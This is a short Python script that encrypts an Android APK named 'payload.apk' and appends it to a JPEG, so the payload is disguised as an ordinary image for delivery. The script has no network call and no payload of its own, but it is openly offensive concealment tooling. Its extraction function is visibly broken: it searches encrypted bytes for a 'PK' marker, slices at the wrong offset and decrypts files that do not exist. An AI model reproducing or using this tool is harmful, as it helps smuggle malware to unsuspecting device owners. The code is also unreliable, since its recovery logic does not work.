import os
import sys
import time
import base64
import shutil
import subprocess
from PIL import Image
import requests
import random
import string
import pyAesCrypt

def randomString(stringLength=5):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def encrypt_file(password, in_filename, out_filename):
    bufferSize = 64 * 1024
    pyAesCrypt.encryptFile(in_filename, out_filename, password, bufferSize)

def decrypt_file(password, in_filename, out_filename):
    bufferSize = 64 * 1024
    pyAesCrypt.decryptFile(in_filename, out_filename, password, bufferSize)

def hide_apk(apk_path, jpg_path, output_path):
    password = randomString(16)
    encrypt_file(password, apk_path, apk_path + ".aes")
    apk_path = apk_path + ".aes"
    with open(apk_path, "rb") as f:
        apk_data = f.read()
    with open(jpg_path, "ab") as f:
        f.write(apk_data)
    os.rename(jpg_path, output_path)
    return password

def show_apk(password, jpg_path, apk_path):
    with open(jpg_path, "rb") as f:
        jpg_data = f.read()
    apk_data = jpg_data[jpg_data.find(b"PK")+1:]
    with open(apk_path, "wb") as f:
        f.write(apk_data)
    decrypt_file(password, apk_path + ".aes", apk_path + ".aes.dec")
    os.rename(apk_path + ".aes.dec", apk_path + ".aes")
    decrypt_file(password, apk_path + ".aes", apk_path)
    os.remove(apk_path + ".aes")

def main():
    apk_path = "/root/payload.apk"
    jpg_path = "/root/original.jpg"
    output_path = "/root/Desktop/1.jpg"
    hide_apk(apk_path, jpg_path, output_path)

if __name__ == "__main__":
    main()